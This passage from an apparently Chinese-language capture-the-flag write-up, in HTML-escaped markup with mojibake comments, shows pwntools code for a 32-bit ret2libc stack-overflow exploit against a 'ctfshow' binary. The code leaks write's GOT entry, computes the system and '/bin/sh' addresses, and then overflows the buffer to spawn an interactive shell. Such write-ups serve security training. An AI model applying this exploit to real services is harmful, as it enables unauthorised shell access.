&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;system address: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%#x&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;system_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh address: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%#x&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binsh_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ„é€ ç¬¬äºŒä¸ªpayloadï¼šè°ƒç”¨system(&amp;#34;/bin/sh&amp;#34;)è·å–shell&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;# å†æ¬¡å¡«å……ç¼“å†²åŒºåˆ°è¿”å›åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;# è¦†ç›–è¿”å›åœ°å€ä¸ºsystemå‡½æ•°åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;# systemæ‰§è¡Œåçš„è¿”å›åœ°å€ï¼ˆéšæ„å¡«å……ï¼Œä¸å½±å“åŠŸèƒ½ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;binsh_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;              &lt;span class=&#34;c1&#34;&gt;# systemå‡½æ•°çš„å‚æ•°ï¼š/bin/shå­—ç¬¦ä¸²åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‘é€ç¬¬äºŒä¸ªpayloadï¼Œè§¦å‘systemè°ƒç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œä¸è·å–åˆ°çš„shellè¿›è¡Œäº¤äº’&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æ— å¤‡æ³¨ä»£ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctfshow&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ctfshow&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;140&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write_plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctfshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;write address: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%#x&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;binsh_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;search&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;libc base: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%#x&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;system address: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%#x&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;system_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh address: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%#x&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binsh_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;binsh_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;éœ€è¦æ³¨æ„çš„ç‚¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è·å–å…³é”®åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_plt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# ä»ç¨‹åºç¬¦å·è¡¨è·å–writeå‡½æ•°çš„PLTåœ°å€ï¼ˆç”¨äºè°ƒç”¨ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# ä»ç¨‹åºå…¨å±€åç§»è¡¨è·å–writeå‡½æ•°çš„GOTåœ°å€ï¼ˆå­˜å‚¨çœŸå®åœ°å€ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctfshow&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ctfshow&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# è·å–å­˜åœ¨æ ˆæº¢å‡ºçš„ctfshowå‡½æ•°åœ°å€ï¼ˆç”¨äºäºŒæ¬¡æº¢å‡ºï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
